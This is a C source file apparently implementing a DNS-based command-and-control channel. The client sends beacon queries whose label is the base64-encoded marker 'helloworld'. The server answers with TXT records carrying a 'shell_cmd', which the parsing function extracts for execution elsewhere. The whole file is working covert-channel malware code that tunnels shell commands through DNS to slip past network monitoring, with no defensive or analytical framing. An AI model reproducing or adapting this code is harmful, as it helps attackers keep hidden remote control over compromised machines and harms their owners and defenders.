#include"header.h"
#include"dns_packet_op.h"
#include "base64.h"

#define STAND_DOMAIN_NAME       "helloworld"
#define STAND_DOMAIN_NAME_ENCODE      "aGVsbG93b3JsZA=="

#define printf_char(a,b)        do{\
                                   int i;\
                                   for (i = 0;i < b;i++) {\
                                                          printf("%c",a[i]);\
                                                         }\
                                   printf("\n");\
                                  }while(0);

int parse_dns_packet_req(unsigned char *packet,int packet_len,dp_t *info)
{
        unsigned char *ptr;
        int dn_len;

        if ((packet == NULL) || (info == NULL)) {
                return -1;
        }
        if (packet_len < 13) {
                return -1;
        }

        memset(info,0,sizeof(dp_t));

        ptr = packet;
        memcpy((unsigned char *)&(info->packet_flag),packet,2);
        //printf("packet_flag:%04x\n",info->packet_flag);

        ptr += 12;
        dn_len = *ptr;
        if (packet_len < (13 + dn_len)) {
                return -1;
        }

        //memcpy(info->domain_name,++ptr,dn_len);
        //printf("domain name:%s\n",info->domain_name);
        //printf("%s\n",info->domain_name);

        info->dn_length = base64_decode((char *)++ptr,dn_len,(unsigned char *)info->domain_name);
        //printf("domain_name:%s\n",info->domain_name);

        return ((strcmp(STAND_DOMAIN_NAME,(info->domain_name)) == 0) ? 1 : 0);
}

int parse_dns_packet_res(unsigned char *packet,int packet_len,unsigned char *cmd,int cmd_len)
{
        unsigned char *ptr;
        int dn_len;
        int res;
        int data_len;
        int txt_len;

        if ((packet == NULL) || (cmd == NULL)) {
                return -1;
        }
        if (packet_len < 45) {
                return -1;
        }

        memset(cmd,0,cmd_len);

        ptr = packet;
        ptr += 2;

        if ((ptr[0] & 0x80) != 0x80) {
                //printf("not response\n");
                return 0;
        }

        ptr += 5;
        if (ptr[0] != 0x01) {
                //printf("no answer\n");
                return 0;
        }

        ptr += 5;
        dn_len = *ptr;

        ++ptr;
       // printf_char(ptr,dn_len);
        res = memcmp(STAND_DOMAIN_NAME_ENCODE,ptr,dn_len);

        if (res != 0) {
                return 0;
        }

        ptr += dn_len + 5;
        ptr += 15;

        //printf("data len:%d\n",ptr[0]);
        data_len = ptr[0];
        if (data_len < 1) {
                //printf("data len too short\n");
                return -1;
        }
        ptr++;

        txt_len = ptr[0];
        //printf("txt len:%d\n",ptr[0]);
        if (txt_len < 1) {
                //printf("no cmd found\n");
                return -1;
        }
        if (packet_len < (45 + txt_len)) {
                return -1;
        }
        ptr++;

        memcpy(cmd,ptr,((txt_len > cmd_len) ? cmd_len:txt_len));

        return txt_len;
}

int make_dns_response_pk(unsigned char *packet,int pk_len,drs_t *response)
{
        unsigned char *res_ptr;
        unsigned char *pk_ptr;

        if ((packet == NULL) || (response == NULL)) {
                return -1;
        }

        pk_ptr = packet;
        res_ptr = response->res_buf;
        memset(res_ptr,0,sizeof(response->res_buf));

        memcpy(res_ptr,pk_ptr,pk_len);
        res_ptr[2] |= 0x80;
        res_ptr[7] = 0x01;
        res_ptr += pk_len;

        memcpy(res_ptr,"\xc0\x0c\x00\x10\x00\x01\x00\x00\x00\x3c",10);
        res_ptr += 10;

        res_ptr++;
        *(res_ptr++) = response->sc_length + 1;
        *(res_ptr++) = response->sc_length;

        memcpy(res_ptr,response->shell_cmd,*(res_ptr - 1));

        res_ptr += response->sc_length;

        response->res_buf_length = res_ptr - response->res_buf;

        return 1;
}

int make_dns_request_pk(dq_t *request)
{
        unsigned char *req_ptr;
        int res;

        if (request == NULL) {
                return -1;
        }

        req_ptr = request->req_buf;
        memset(req_ptr,0,sizeof(request->req_buf));

        memcpy(req_ptr,(unsigned char *)&(request->packet_flag),2);
        req_ptr += 2;

        memcpy(req_ptr,"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00",10);
        req_ptr += 10;

        req_ptr++;
        res = base64_encode((unsigned char *)request->domain_name,request->dn_length,(char *)req_ptr);
        *(req_ptr - 1) = res;
        //memcpy(req_ptr,request->domain_name,*(req_ptr - 1));
        req_ptr += *(req_ptr - 1);
        *(req_ptr++) = 0x3;
        memcpy(req_ptr,"com",4);
        req_ptr += 4;
        memcpy(req_ptr,"\x00\x01\x00\x01",4);
        req_ptr += 4;

        request->req_buf_length = req_ptr - request->req_buf;

        return 1;
}


